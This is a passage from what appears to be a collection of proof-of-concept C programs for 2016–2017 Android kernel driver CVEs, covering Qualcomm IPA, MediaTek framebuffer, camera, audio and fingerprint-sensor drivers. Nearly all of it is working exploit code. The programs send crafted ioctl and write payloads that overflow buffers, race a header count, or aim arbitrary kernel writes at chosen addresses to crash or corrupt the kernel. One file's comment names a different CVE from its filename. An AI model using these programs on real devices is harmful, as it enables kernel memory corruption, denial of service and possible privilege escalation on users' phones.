	int total_len;
}hdd_priv_data_t;


static void fill_data(char *data, int used) {
	while(used <= 8192)
		used += snprintf(data + used, 8192 - used,
				 " %d %d %d %d", 1, 2, 3, 4);
}


int main(void)
{
	int fd;
	struct ifreq freak = { 0 };
	memcpy(freak.ifr_name, "wlan0", 5);
	fd = socket(AF_INET, SOCK_STREAM, 0);
	hdd_priv_data_t priv_data = { 0 };
	priv_data.total_len = 8192;
	priv_data.buf = mmap(NULL, 4096 * 3, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);

	/*
	  CCXPLMREQ<space><enable><space><dialog_token><space>
	  <meas_token><space><num_of_bursts><space><burst_int><space>
	  <measu duration><space><burst_len><space><desired_tx_pwr> 8
	  <space><multcast_addr><space><number_of_channels>
	  <space><channel_numbers>
	*/

	strcpy(priv_data.buf, "CCXPLMREQ 1 2 3 4 5 6 7 8 FF FF FF FF FF FF 255 ");

	/*
	       1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \
	       25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 41 43 44 45 46 47 48 49 50 \
	       1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \
	       25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 41 43 44 45 46 47 48 49 50 \
	       1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \
	       25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 41 43 44 45 46 47 48 49 50 \
	       1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \
	       25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 41 43 44 45 46 47 48 49 50 \
	       1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \
	       25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 41 43 44 45 46 47 48 49 50 \
	       1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ");
	*/
	fill_data(priv_data.buf, 48);

	
	if (fd < 0) {
		printf("Failed with %s\n", strerror(errno));
	}
	printf("Got socket # %d\n", fd);
	freak.ifr_data = (void*)&priv_data;
	ioctl(fd, SIOCDEVPRIVATE + 1, &freak);
	printf("ret is %s\n", strerror(errno));
	close(fd);

}


```

`CVE-2016-3813.c`:

```c
/*** CVE-2016-3818.c
 *
 * https://code.google.com/p/android/issues/detail?id=206298
 * https://android.googlesource.com/kernel/msm.git/+/android-msm-bullhead-3.10-n-preview-1/drivers/usb/dwc3/debugfs.c#647
 *
 */


#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <strings.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <inttypes.h>

static const char *dev = "/sys/kernel/debug/f9200000.dwc3";
static const char *str = "0 9999999";

int main(void)
{
	int fd;
	char save[15] = { 0 };
	fd = open(dev, O_RDWR);
	if (fd < 0) {
		printf("Failed to open %s with %s\n", dev, strerror(errno));
		return EXIT_FAILURE;
	}

	if (write(fd, str, sizeof(str)) != sizeof(str)) {
		printf("failed to write entire payload\n");
		close(fd);
		return EXIT_FAILURE;
	}

	read(fd, save, sizeof(save));

	/* phone should crash */
	return EXIT_FAILURE;
}

```

`CVE-2016-3815.c`:

```c
/*** CVE-2016-3815.c
 *
 * https://code.google.com/p/android/issues/detail?id=208804
 * https://android.googlesource.com/kernel/tegra.git/+/android-tegra-flounder-3.10-n-preview-2/drivers/media/platform/tegra/cam_dev/virtual.c#433
 *
 *
 */


#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <strings.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

typedef uint32_t __u32;
typedef unsigned char __u8;

const char *dev = "/dev/camera.pcl";

#define CAMERA_MAX_NAME_LENGTH  32
#define VIRTUAL_DEV_MAX_REGULATORS      8
#define VIRTUAL_DEV_MAX_GPIOS           8
#define VIRTUAL_DEV_MAX_POWER_SIZE      32
#define VIRTUAL_REGNAME_SIZE            (VIRTUAL_DEV_MAX_REGULATORS * \
					 CAMERA_MAX_NAME_LENGTH) //256

enum {
        CAMERA_DEVICE_TYPE_I2C,
        CAMERA_DEVICE_TYPE_MAX_NUM,
};

enum regcache_type {
        REGCACHE_NONE,
        REGCACHE_RBTREE,
        REGCACHE_COMPRESSED,
        REGCACHE_FLAT,
};

struct regmap_cfg {
        int addr_bits;
        int val_bits;
        __u32 cache_type;
};

struct virtual_device {
        //void *power_on;
        //void *power_off;
	uint32_t k;
	uint32_t w;
        struct regmap_cfg regmap_cfg;
        __u32 bus_type;
        __u32 gpio_num;
        __u32 reg_num;
        __u32 pwr_on_size;
        __u32 pwr_off_size;
        __u32 clk_num;
        __u8 name[32];
        __u8 reg_names[VIRTUAL_REGNAME_SIZE];
};

#define PCLLK_IOCTL_CHIP_REG    _IOW('o', 100, struct virtual_device)

int main(void)
{
	int fd;
	struct virtual_device vdev = { 0 };
	fd = open(dev, O_RDWR);
	if (fd < 0) {
		printf("Failed to open %s with errno as %s\n",
		       dev, strerror(errno));
		return EXIT_FAILURE;
	}

	vdev.k = 1;
	vdev.w = 1;
	/*
	vdev.power_on = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
	vdev.power_off = vdev.power_on;

	if (vdev.power_on == MAP_FAILED) {
		close(fd);
		printf("Failed to mmap some data with %s\n", strerror(errno));
		return EXIT_FAILURE;
	}
	*/
	memset(vdev.name, 'A', 32);
	printf("%s\n", vdev.name);
	memset(vdev.reg_names, 'A', VIRTUAL_REGNAME_SIZE);
	vdev.reg_num = 0xFFFFFFFF;

	vdev.bus_type = CAMERA_DEVICE_TYPE_I2C;
	vdev.regmap_cfg.addr_bits = 16;
	vdev.regmap_cfg.val_bits = 8;
	vdev.regmap_cfg.cache_type = REGCACHE_NONE;
	vdev.gpio_num = 1;
	vdev.pwr_on_size = 1;
	vdev.pwr_off_size = 1; /* prevent null terminiation */

	ioctl(fd, PCLLK_IOCTL_CHIP_REG, &vdev);

	return EXIT_FAILURE;
}

```

`CVE-2016-3867.c`:

```c
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <strings.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <net/if.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <pthread.h>

static const char *dev = "/dev/ipa";

#define IPA_RESOURCE_NAME_MAX 32
#define IPA_HDR_MAX_SIZE 64
#define IPA_IOCTL_ADD_HDR            0
#define IPA_IOCTL_DEL_HDR            1

enum ipa_hdr_l2_type {
        IPA_HDR_L2_NONE,
        IPA_HDR_L2_ETHERNET_II,
        IPA_HDR_L2_802_3,
        IPA_HDR_L2_MAX,
};

struct ipa_hdr_del {
        uint32_t hdl;
        int status;
};

struct ipa_ioc_del_hdr {
        uint8_t commit;
        uint8_t num_hdls;
        struct ipa_hdr_del hdl[0];
};


struct ipa_hdr_add {
        char name[IPA_RESOURCE_NAME_MAX];
        uint8_t hdr[IPA_HDR_MAX_SIZE];
        uint8_t hdr_len;
        enum ipa_hdr_l2_type type;
        uint8_t is_partial;
        uint32_t hdr_hdl;
        int status;
        uint8_t is_eth2_ofst_valid;
        uint16_t eth2_ofst;
};

struct ipa_ioc_add_hdr {
        uint8_t commit;
        uint8_t num_hdrs;
        struct ipa_hdr_add hdr[0];
};

#define IPA_IOC_MAGIC 0xCF


#define IPA_IOC_ADD_HDR _IOWR(IPA_IOC_MAGIC, IPA_IOCTL_ADD_HDR,\
			      struct ipa_ioc_add_hdr *)


#define IPA_IOC_DEL_HDR _IOWR(IPA_IOC_MAGIC, \
			      IPA_IOCTL_DEL_HDR,\
			      struct ipa_ioc_del_hdr *)



volatile int trigger = 0;
volatile int trigger1 = 0;
static void *size_change(void *hdr)
{
	struct ipa_ioc_add_hdr *add_hdr = hdr;
	static unsigned int stupid_hack = 2000;

	trigger1 = 1;
	while (trigger == 0) { };
	usleep(stupid_hack);
	add_hdr->num_hdrs = 255;
	stupid_hack++;
	if (stupid_hack > 3000)
		stupid_hack = 2000;

	trigger1 = 0;
	return NULL;
}


int main(void)
{

	int fd, counter;
	pthread_t race_car;
	struct ipa_ioc_add_hdr add_hdr = { 0 };

	fd = open(dev, O_RDWR);
	if (fd < 0) {
		printf("Failed to open %s with %s\n", dev, strerror(errno));
		return EXIT_FAILURE;
	}

	for (counter = 0; counter < 10000; counter++) {
		pthread_create(&race_car, NULL, size_change, &add_hdr);
		while(trigger1 != 1) {}
		trigger = 1;
		asm volatile("dmb ishst" : : : "memory");
		ioctl(fd, IPA_IOC_ADD_HDR, &add_hdr);
		pthread_join(race_car, NULL);
		trigger = 0;
		add_hdr.num_hdrs = 0;
	}

	return EXIT_FAILURE;
}

```

`CVE-2016-3868.c`:

```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>

static const char *dev = "/sys/kernel/debug/msm_core/ptable";
static const char *crasher = "1 1 1 1 4702111234474983745";
int main(void)
{
	int fd;
	fd = open(dev, O_WRONLY);
	if (fd < 0) {
		printf("Failed to open %s with %s\n", dev, strerror(errno));
		return EXIT_FAILURE;
	}
	write(fd, crasher, strlen(crasher));
}

```

`CVE-2016-3893.c`:

```c
/**
 *
 * CVE-2016-3893.c
 * https://code.google.com/p/android/issues/detail?id=213554
 *
 */

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

enum wcd_cal_type {
        WCD9XXX_MIN_CAL,
        WCD9XXX_ANC_CAL = WCD9XXX_MIN_CAL,
        WCD9XXX_MAD_CAL,
        WCD9XXX_MBHC_CAL,
        WCD9XXX_MAX_CAL,
};


struct wcdcal_ioctl_buffer {
        __u32 size;
        __u8 __user *buffer;
        enum wcd_cal_type cal_type;
};

#define SNDRV_CTL_IOCTL_HWDEP_CAL_TYPE \
        _IOW('U', 0x1, struct wcdcal_ioctl_buffer)


int main(void)
{
	int i;
	const  char *dev = "/dev/snd/hwC0D1000";
	int fd;
	struct wcdcal_ioctl_buffer buf = { 0 };
	buf.size = 0xF;
	buf.buffer = 0x414100ABADACC355;
	buf.cal_type = WCD9XXX_MAD_CAL;

	printf("Opening %s\n", dev);
	fd = open(dev, O_WRONLY);
	if (fd > 0) {
		printf("ioctl\n");
		ioctl(fd, SNDRV_CTL_IOCTL_HWDEP_CAL_TYPE, &buf);
		printf("strerror %s\n", strerror(errno));
	}
	else
		printf("Error on %s with %s\n", dev, strerror(errno));

	//sleep(1);
	close(fd);
}


```

`CVE-2016-3902.c`:

```c
/* CVE-2016-3902.c
 *
 * October BUlletin
 *
 * https://code.google.com/p/android/issues/detail?id=214974
 *
 */

#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <strings.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <net/if.h>
#include <sys/types.h>

#define IPA_INT_MAX     ((int)(~0U>>1))
#define IPA_INT_MIN     (-IPA_INT_MAX - 1)
#define QMI_IPA_MAX_FILTERS_V01 64

struct ipa_filter_handle_to_index_map_v01 {
        uint32_t filter_handle;
        uint32_t filter_index;
};  /* Type */

enum ipa_qmi_result_type_v01 {
        /* To force a 32 bit signed enum. Do not change or use*/
        IPA_QMI_RESULT_TYPE_MIN_ENUM_VAL_V01 = IPA_INT_MIN,
        IPA_QMI_RESULT_SUCCESS_V01 = 0,
        IPA_QMI_RESULT_FAILURE_V01 = 1,
        IPA_QMI_RESULT_TYPE_MAX_ENUM_VAL_V01 = IPA_INT_MAX,
};


struct ipa_fltr_installed_notif_req_msg_v01 {
        uint32_t source_pipe_index;
        enum ipa_qmi_result_type_v01 install_status;
        uint32_t filter_index_list_len;
        struct ipa_filter_handle_to_index_map_v01
	filter_index_list[QMI_IPA_MAX_FILTERS_V01];
        uint8_t embedded_pipe_index_valid;
        uint32_t embedded_pipe_index;
        uint8_t retain_header_valid;
        uint8_t retain_header;
        uint8_t embedded_call_mux_id_valid;
        uint32_t embedded_call_mux_id;
        uint8_t num_ipv4_filters_valid;
        uint32_t num_ipv4_filters;
        uint8_t num_ipv6_filters_valid;
        uint32_t num_ipv6_filters;
        uint8_t start_ipv4_filter_idx_valid;
        uint32_t start_ipv4_filter_idx;
        uint8_t start_ipv6_filter_idx_valid;
        uint32_t start_ipv6_filter_idx;
};  /* Message */


#define WAN_IOC_MAGIC 0x69

#define WAN_IOCTL_ADD_FLT_INDEX         2

#define WAN_IOC_ADD_FLT_RULE_INDEX _IOWR(WAN_IOC_MAGIC, \
                WAN_IOCTL_ADD_FLT_INDEX, \
					 struct ipa_fltr_installed_notif_req_msg_v01 *)


static const char* dev = "/dev/wwan_ioctl";

int main(void)
{
	int fd;
	struct ipa_fltr_installed_notif_req_msg_v01 msg = { 0 };
	fd = open(dev, O_RDWR);
	if (fd < 0) {
		printf("Failed to open %s with %s\n", dev, strerror(errno));
		return EXIT_FAILURE;
	}

	msg.filter_index_list_len = 0xBADC0DE;
	msg.filter_index_list[0].filter_index = 0; /* technically already set to 0 */
	/* set the pipe index to fail on the check */
	msg.source_pipe_index = 0xbeef;

	ioctl(fd, WAN_IOC_ADD_FLT_RULE_INDEX, &msg);

}

```

`CVE-2016-3928-and-CVE-2016-3936-mtk.c`:

```c
/* CVE-2016-3928-and-CVE-2016-3936-mtk.c
 *
 * October BUlletin
 *
 * https://code.google.com/p/android/issues/detail?id=215336
 */

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <limits.h>
#include <inttypes.h>


#define MTK_IOW(num, dtype)     _IOW('O', num, dtype)
#define MTK_IOR(num, dtype)     _IOR('O', num, dtype)
#define MTK_IOWR(num, dtype)    _IOWR('O', num, dtype)
#define MTK_IO(num)             _IO('O', num)


#define MAKE_MTK_FB_FORMAT_ID(id, bpp)  (((id) << 8) | (bpp))
typedef enum {
	MTK_FB_FORMAT_UNKNOWN = 0,

	MTK_FB_FORMAT_RGB565 = MAKE_MTK_FB_FORMAT_ID(1, 2),
	MTK_FB_FORMAT_RGB888 = MAKE_MTK_FB_FORMAT_ID(2, 3),
	MTK_FB_FORMAT_BGR888 = MAKE_MTK_FB_FORMAT_ID(3, 3),
	MTK_FB_FORMAT_ARGB8888 = MAKE_MTK_FB_FORMAT_ID(4, 4),
	MTK_FB_FORMAT_ABGR8888 = MAKE_MTK_FB_FORMAT_ID(5, 4),
	MTK_FB_FORMAT_YUV422 = MAKE_MTK_FB_FORMAT_ID(6, 2),
	MTK_FB_FORMAT_XRGB8888 = MAKE_MTK_FB_FORMAT_ID(7, 4),
	MTK_FB_FORMAT_XBGR8888 = MAKE_MTK_FB_FORMAT_ID(8, 4),
	MTK_FB_FORMAT_UYVY = MAKE_MTK_FB_FORMAT_ID(9, 2),
	MTK_FB_FORMAT_YUV420_P = MAKE_MTK_FB_FORMAT_ID(10, 2),
	MTK_FB_FORMAT_YUY2 = MAKE_MTK_FB_FORMAT_ID(11, 2),
	MTK_FB_FORMAT_BPP_MASK = 0xFF,
} MTK_FB_FORMAT;

typedef enum {
        MTK_FB_ORIENTATION_0 = 0,
        MTK_FB_ORIENTATION_90 = 1,
        MTK_FB_ORIENTATION_180 = 2,
        MTK_FB_ORIENTATION_270 = 3,
} MTK_FB_ORIENTATION;

typedef enum {
        LAYER_2D = 0,
        LAYER_3D_SBS_0 = 0x1,
        LAYER_3D_SBS_90 = 0x2,
        LAYER_3D_SBS_180 = 0x3,
        LAYER_3D_SBS_270 = 0x4,
        LAYER_3D_TAB_0 = 0x10,
        LAYER_3D_TAB_90 = 0x20,
        LAYER_3D_TAB_180 = 0x30,
        LAYER_3D_TAB_270 = 0x40,
} MTK_FB_LAYER_TYPE;


struct fb_overlay_layer {
        unsigned int layer_id;
        unsigned int layer_enable;

        void *src_base_addr;
        void *src_phy_addr;
        unsigned int src_direct_link;
        MTK_FB_FORMAT src_fmt;
        unsigned int src_use_color_key;
        unsigned int src_color_key;
        unsigned int src_pitch;
        unsigned int src_offset_x, src_offset_y;
        unsigned int src_width, src_height;

        unsigned int tgt_offset_x, tgt_offset_y;
        unsigned int tgt_width, tgt_height;
        MTK_FB_ORIENTATION layer_rotation;
        MTK_FB_LAYER_TYPE layer_type;
        MTK_FB_ORIENTATION video_rotation;

        unsigned int isTdshp;   /* set to 1, will go through tdshp first, then layer blending, then to color */

        int next_buff_idx;
        int identity;
        int connected_type;
        unsigned int security;
        unsigned int alpha_enable;
        unsigned int alpha;
        int fence_fd;           /* 8135 */
        int ion_fd;             /* 8135 CL 2340210 */
};

#define MTKFB_SET_OVERLAY_LAYER                MTK_IOW(0, struct fb_overlay_layer)


/** START FOR FB FORMAT ID */

struct fb_slt_catpure {
        MTK_FB_FORMAT format;
        volatile char *outputBuffer;
        unsigned int wdma_width;
        unsigned int wdma_height;
};

#define MTKFB_SLT_AUTO_CAPTURE                 MTK_IOWR(27, struct fb_slt_catpure)



/** START DEFINES FOR IF_INFORMATION_KERNEL_WRITE **/
typedef enum {
	DISPIF_TYPE_DBI = 0,
	DISPIF_TYPE_DPI,
	DISPIF_TYPE_DSI,
	DISPIF_TYPE_DPI0,
	DISPIF_TYPE_DPI1,
	DISPIF_TYPE_DSI0,
	DISPIF_TYPE_DSI1,
	HDMI = 7,
	HDMI_SMARTBOOK,
                MHL
} MTKFB_DISPIF_TYPE;

typedef enum {
	DISPIF_MODE_VIDEO = 0,
	DISPIF_MODE_COMMAND
} MTKFB_DISPIF_MODE;

typedef struct mtk_dispif_info {
	unsigned int display_id;
	unsigned int isHwVsyncAvailable;
	MTKFB_DISPIF_TYPE displayType;
	unsigned int displayWidth;
	unsigned int displayHeight;
	unsigned int displayFormat;
	MTKFB_DISPIF_MODE displayMode;
	unsigned int vsyncFPS;
	unsigned int physicalWidth;
	unsigned int physicalHeight;
	unsigned int isConnected;
	unsigned int lcmOriginalWidth;  /* this value is for DFO Multi-Resolution feature, which stores the original LCM Wdith */
	unsigned int lcmOriginalHeight; /* this value is for DFO Multi-Resolution feature, which stores the original LCM Height */
} mtk_dispif_info_t;


#define MTKFB_GET_DISPLAY_IF_INFORMATION       MTK_IOR(22, mtk_dispif_info_t)

/* END DEFINES FOR IF_INFORMATION */

static void do_display_if_information_kernel_write(int fd)
{
	mtk_dispif_info_t mediatek_is_best_tek = { 0 };
	mediatek_is_best_tek.display_id = 0xBADACCE5;
	ioctl(fd, MTKFB_GET_DISPLAY_IF_INFORMATION, &mediatek_is_best_tek);
	printf("Didn't work!, adjust break_stuff number, but keep it negative\n");
}

static void do_slt_auto_capture_kernel_write(int fd)
{

	struct fb_slt_catpure cap = { 0 };
	cap.outputBuffer =(void*) 0xBADACCE5;
	cap.format = MTK_FB_FORMAT_BPP_MASK;
	cap.wdma_width = 4096;
	cap.wdma_height = 4096;

	ioctl(fd, MTKFB_SLT_AUTO_CAPTURE, &cap);
	printf("Didn't Work!, sorry!\n");
}


static void do_set_overlay_layer_kernel_write(int fd)
{
	struct fb_overlay_layer lay = { 0 };
	lay.layer_id = 0xBADACCE5;
	lay.src_fmt = MTK_FB_FORMAT_BPP_MASK;

	/* Lets smash some stack buffers */
	lay.layer_enable = 1;

	ioctl(fd, MTKFB_SET_OVERLAY_LAYER, &lay);
	printf("Didnt work!, adjust layer_id\n");
}

/* DEPRICATED
static void do_capture_frame_buffer_kernel_write(int fd)
{
	

}
*/
int main(int argc, char **argv)
{
	int fd, i;

	if (argc < 2) {
		printf("Please supply the mtk frame buffer dev node\n");
		return EXIT_FAILURE;
	}

	fd = open(argv[1], O_RDWR);

	if (fd < 0) {
		printf("Couldn't open %s with error %s\n", argv[1], strerror(errno));
		exit(EXIT_FAILURE);
	}

	do_display_if_information_kernel_write(fd);
	/** DEPRICATED do_capture_frame_buffer_kernel_write(fd);*/
	do_slt_auto_capture_kernel_write(fd);
	do_set_overlay_layer_kernel_write(fd);
}

```

`CVE-2016-3937.c`:

```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <limits.h>
#include <inttypes.h>


static const char *dev = "/sys/kernel/debug/mtkfb";



int main(void)
{
	int fd;

	const char *exploit_str = "regw:BADACCE54141414141";
	const char *exploit_str1 = "regw:BADACCE5 4141414141";
	const char *exploit_str2 = "regw: BADACCE5 4141414141";

	fd = open(dev, O_RDWR);
	if (fd < 0) {
		printf("Couldn't open %s with error %s\n", dev, strerror(errno));
		return EXIT_FAILURE;
	}
	write(fd, exploit_str, strlen(exploit_str));
	write(fd, exploit_str1, strlen(exploit_str1));
	write(fd, exploit_str2, strlen(exploit_str2));

}

```

`CVE-2017-0451.c`:

```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define MSG_REGISTER 0x1
#define MSG_REQUEST  0x2
#define MSG_RESPONSE 0x3

struct voice_svc_write_msg {
        uint32_t msg_type;
        uint8_t payload[0];
};


int main(void) {
	int fd;
	struct voice_svc_write_msg msg = { 0 };
	msg.msg_type = MSG_REGISTER;
	msg.payload[0] = 0xff;
	fd = open("/dev/voice_svc", O_WRONLY);
	if (fd > 0) {
		write(fd, &msg, sizeof(msg));
	}
	else
		printf("Error on /dev/voice_svc with %s\n", strerror(errno));

	close(fd);
 }


```

`CVE-2017-0504_mtk.c`:

```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <limits.h>
#include <inttypes.h>

typedef uint8_t u8;
typedef uint16_t u16;

#pragma pack(1)
typedef struct {
        u8 wr;                  /* write read flag 0:R  1:W  2:PID 3: */
        u8 flag;                /* 0:no need flag/int 1: need flag  2:need int */
        u8 flag_addr[2];        /* flag address */
        u8 flag_val;            /* flag val */
        u8 flag_relation;       /* flag_val:flag 0:not equal 1:equal 2:> 3:< */
        u16 circle;             /* polling cycle */
        u8 times;               /* plling times */
        u8 retry;               /* I2C retry times */
        u16 delay;              /* delay befor read or after write */
	u16 data_len;           /* data length */
        u8 addr_len;            /* address length */
	u8 addr[2];             /* address */
	u8 res[3];              /* reserved */
        u8 *data;               /* data pointer */
} st_cmd_head;
#pragma pack()



int main(int argc, char **argv)
{
	st_cmd_head cmd_head = { 0 };
	int fd;

	if (argc < 2) {
		printf("Please provide a location to the entry. "\
		       "it should start with the name 'gmnode' then a date "\
		       "After.\n");
		return EXIT_FAILURE;
	}

	fd = open(argv[1], O_RDWR);

	if (fd < 0) {
		printf("Couldn't open %s with error %s\n", argv[1], strerror(errno));
		return EXIT_FAILURE;
	}

	cmd_head.wr = 15;
	cmd_head.data_len = 65534;

	write(fd, &cmd_head, sizeof(cmd_head));

	printf("Write completed? Probably should be rebooting now\n");
	return EXIT_FAILURE;
}

```

`CVE-2017-0516.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdbool.h>
#include <errno.h>
#include <string.h>

static const char *dev = "/dev/hbtp_input";

struct hbtp_input_absinfo {
	bool     active;
	uint16_t code;
	int32_t  minimum;
	int32_t  maximum;
};


#define HBTP_INPUT_IOCTL_BASE   'T'
#define HBTP_SET_ABSPARAM       _IOW(HBTP_INPUT_IOCTL_BASE, 201, \
					     struct hbtp_input_absinfo *)

#define ABS_MT_TOUCH_MAJOR      0x30    /* Major axis of touching ellipse */
#define ABS_MT_TOUCH_MINOR      0x31    /* Minor axis (omit if circular) */
#define ABS_MT_TOOL_Y           0x3d    /* Center Y tool position */

#define ABS_MT_FIRST            ABS_MT_TOUCH_MAJOR
#define ABS_MT_LAST             ABS_MT_TOOL_Y


static int getfd(const char* dev_node)
{
	int fd;
	fd = open(dev_node, O_RDWR);
	if (fd < 0) {
		fprintf(stderr, "Couldn't open devnode %s with error %s\n", dev_node, strerror(errno));
		exit(EXIT_FAILURE);
	}

	return fd;
}


int main(void)
{
	int i;
	struct hbtp_input_absinfo absinfo[ABS_MT_LAST - ABS_MT_FIRST + 1] = { 0 };
	int fd = getfd(dev);

	for (i = 0; i < ABS_MT_LAST - ABS_MT_FIRST + 1; i++) {
		absinfo[i].active = 1;
		absinfo[i].code = 0xFFFF - i;
		absinfo[i].minimum = 0xAAAAAAAA;
		absinfo[i].maximum = 0xAAAAAAAA;
	}
	
	while(true) {
		ioctl(fd, HBTP_SET_ABSPARAM, absinfo);
	}

}

```

`CVE-2017-0518_0519.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/types.h>          /* See NOTES */
#include <sys/socket.h>
#include <fcntl.h>
#include <stdbool.h>
#include <errno.h>
#include <string.h>
#include <pthread.h>

static const char *dev = "/dev/qbt1000";

#define QBT1000_SNS_SERVICE_ID          0x138 /* From sns_common_v01.idl */
#define QBT1000_SNS_SERVICE_VER_ID      1
#define QBT1000_SNS_INSTANCE_INST_ID    0

#define SNS_QFP_OPEN_RESP_V01 0x0020

#define QMI_REQUEST_CONTROL_FLAG 0x00
#define QMI_RESPONSE_CONTROL_FLAG 0x02
#define QMI_INDICATION_CONTROL_FLAG 0x04
#define QMI_HEADER_SIZE 7

#define OPTIONAL_TLV_TYPE_START 0x10

enum elem_type {
	QMI_OPT_FLAG = 1,
	QMI_DATA_LEN,
	QMI_UNSIGNED_1_BYTE,
	QMI_UNSIGNED_2_BYTE,
	QMI_UNSIGNED_4_BYTE,
	QMI_UNSIGNED_8_BYTE,
	QMI_SIGNED_2_BYTE_ENUM,
	QMI_SIGNED_4_BYTE_ENUM,
	QMI_STRUCT,
	QMI_STRING,
	QMI_EOTI,
};

volatile int cont = 1;

struct qmi_header {
	unsigned char cntl_flag;
	uint16_t txn_id;
	uint16_t msg_id;
	uint16_t msg_len;
} __attribute__((__packed__));

struct qseecom_handle {
	void *dev; /* in/out */
	unsigned char *sbuf; /* in/out */
	uint32_t sbuf_len; /* in/out */
};

enum qbt1000_commands {
	QBT1000_LOAD_APP = 100,
	QBT1000_UNLOAD_APP = 101,
	QBT1000_SEND_TZCMD = 102
};

struct qbt1000_app {
	struct qseecom_handle **app_handle;
	char name[32];
	uint32_t size;
	uint8_t high_band_width;
};

struct qbt1000_send_tz_cmd {
	struct qseecom_handle *app_handle;
	uint8_t *req_buf;
	uint32_t req_buf_len;
	uint8_t *rsp_buf;
	uint32_t rsp_buf_len;
};

struct msm_ipc_port_addr {
	uint32_t node_id;
	uint32_t port_id;
};

struct msm_ipc_port_name {
	uint32_t service;
	uint32_t instance;
};

struct msm_ipc_addr {
	unsigned char  addrtype;
	union {
		struct msm_ipc_port_addr port_addr;
		struct msm_ipc_port_name port_name;
	} addr;
};


/*
 * Socket API
 */

#define AF_MSM_IPC 27

#define PF_MSM_IPCAF_MSM_IPC

#define MSM_IPC_ADDR_NAME 1
#define MSM_IPC_ADDR_ID 2

struct sockaddr_msm_ipc {
	unsigned short family;
	struct msm_ipc_addr address;
	unsigned char reserved;
};

struct qbt1000_app app = { 0 };

static int get_fd(const char* dev_node)
{
	int fd;
	fd = open(dev_node, O_RDWR);
	if (fd < 0) {
		fprintf(stderr, "Couldn't open devnode %s with error %s\n", dev_node, strerror(errno));
		cont = 0;
		exit(EXIT_FAILURE);
	}

	return fd;
}

static void leak_heap_ptr(int fd)
{
	void *addr = NULL;
	app.app_handle = (void *) &addr;
	app.size = 32;
	ioctl(fd, QBT1000_LOAD_APP, &app);
}

static void arb_kernel_write_load_app(int fd)
{
	struct qbt1000_app app = { 0 };

	app.app_handle = (void *) 0xABADACCE55013337;
	ioctl(fd, QBT1000_LOAD_APP, &app);
}

static void arb_kernel_write_send_tzcmd(int fd)
{
	struct qseecom_handle hdl = { 0 };
	struct qbt1000_send_tz_cmd cmd = { 0 };
	int x = 0;

	hdl.sbuf = (void *) 0xffffffc0017b1b84;//malloc(4096);//(void *) 0xABADACCE55000000;
	cmd.app_handle = &hdl;
	cmd.req_buf = &x; cmd.rsp_buf = NULL;//malloc(4096);
	cmd.req_buf_len = cmd.rsp_buf_len = 4;

	ioctl(fd, QBT1000_SEND_TZCMD, &cmd);
}

static void print_msg(char *msg)
{
	int i;
	for (i = 0; i < 4096; i++)
		printf("%hx ", msg[i]);
	printf("\n");
}



static void recv_msgs(int fd)
{
	//ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags);
	struct msghdr msg = { 0 };
	struct iovec io = { 0 };
	struct sockaddr_msm_ipc addr = { 0 };
	struct msm_ipc_addr address = { 0 };
	uint8_t *ptr;
	struct qmi_header *hdr;
	int count = 1;

	printf("sizeof hdr %zu\n", sizeof(*hdr));
	//memset(&address, 0, sizeof(address));

	io.iov_base = malloc(4096);
	memset(io.iov_base, 0, 4096);
	io.iov_len = 4096;

	msg.msg_iovlen = 1;
	msg.msg_iov = &io;
	msg.msg_name = &addr;
	msg.msg_namelen = sizeof(addr);

	while (cont) {
